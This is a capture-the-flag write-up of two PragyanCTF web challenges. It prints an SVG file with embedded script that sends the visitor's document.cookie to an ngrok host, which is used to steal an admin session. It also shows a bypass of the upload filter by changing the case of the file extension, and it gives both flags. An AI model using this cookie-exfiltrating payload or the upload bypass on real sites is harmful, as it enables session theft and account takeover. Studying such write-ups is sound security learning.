---
title: Excesscookie V1 & V2 
author: 0xRaminf0sec
date: 2022-03-07
categories: [PragyanCTF]
tags: [WEB,XSS]
---


> Chall Name : Excess Cookie V1 

> Description : You need to get logged in as admin to complete this challenge.

On visiting the challenge link,it shows normal login and register page.Created the user account and get logged in as normal user.

![Screenshot](https://raw.githubusercontent.com/Ramalingasamy012/PragyanCTF-Web/main/screenshots/sreenshot1.png "Screenshot")

It has the image uploading functionality and i tried to popup the XSS using SVG

> Scalable Vector Graphics(SVG) is an XML-based vector image format for two-dimensional graphics with support for interactivity and animation.

I have the common payload used for fire the XSS using SVG,Here is the payload!!
```

<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
   <script type="text/javascript">
   alert(1);
   </script>
</svg>

```

Here,the website having another functionality which was report the user.If i report any user admin will look into that user profile.
So,What i done was,

Open the terminal and started python http server and open another tab and started  ngrok with the port which is used for python http server

![Screenshot](https://raw.githubusercontent.com/Ramalingasamy012/PragyanCTF-Web/main/screenshots/screensho2.png "Screenshot")

Alter the payload like this, 

```
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">

<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
   <rect width="300" height="100" style="fill:rgb(0,0,255);stroke-width:3;stroke:rgb(0,0,0)" />
   <script type="text/javascript">
var i=new Image;
i.src="http://8eb8-59-98-37-253.ngrok.io/?"+document.cookie;
   
   </script>
</svg>
```
And upload it as the profile picture,after that copy the userid and report it to the admin.
And the ADMIN cookie stealed!!

![Screenshot](https://raw.githubusercontent.com/Ramalingasamy012/PragyanCTF-Web/main/screenshots/admincookie.png "Screenshot")

Change auth cookie to this admin cookie, We found the FLAG !!

```
 p_ctf{x33_a4d_svg_m4k3s_b3st_p41r} 
```

> Chall Name : Excess Cookie V2

> Description : Last challenge vulnerabilities are fixed. Try to solve this.

Same as per first challenge,but svg extension was not accepted.
So,there was a way for bypassing it by renaming the extension as "filename.sVG" and uploaded this ,the site accpeted this svg and XSS fired!!!

There was no change in the payload ,using the same steps what i have done in V1 is enough to get the admin cookie

```
 p_ctf{x33_a4d_svg_m4k3s_b3st_p41r_on1y_w1th_http_0nly} 
```



    